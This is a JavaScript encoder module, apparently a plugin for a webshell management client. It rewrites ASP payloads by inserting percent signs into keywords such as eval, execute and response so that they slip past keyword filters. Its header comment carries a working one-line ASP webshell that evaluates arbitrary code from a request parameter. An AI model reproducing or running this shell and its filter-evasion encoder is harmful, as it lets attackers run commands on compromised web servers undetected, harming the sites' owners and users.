/**
 * asp::insert_percent 编码器
 * 关键词中插入%号
 * Create at: 2019/04/19 15:49:43
 * <%eval request("ant")%>
 */

'use strict';
/*
 * @param  {String} pwd   连接密码
 * @param  {Array}  data  编码器处理前的 payload 数组
 * @return {Array}  data  编码器处理后的 payload 数组
 */
module.exports = (pwd, data) => {
    let _tmp = data['_'].replace(/(eval|cute|execute|server|script|timeout|resume|next|function|for|else|response|mid|end|step|write|then|isnumeric)/ig, function ($, $1) {
        // asunescape(%) 表示括号内的内容不会被 URL 编码
        return $1
            .split('')
            .join('asunescape(%)');
    });
    data[pwd] = Buffer.from(_tmp);
    delete data['_'];
    return data;
}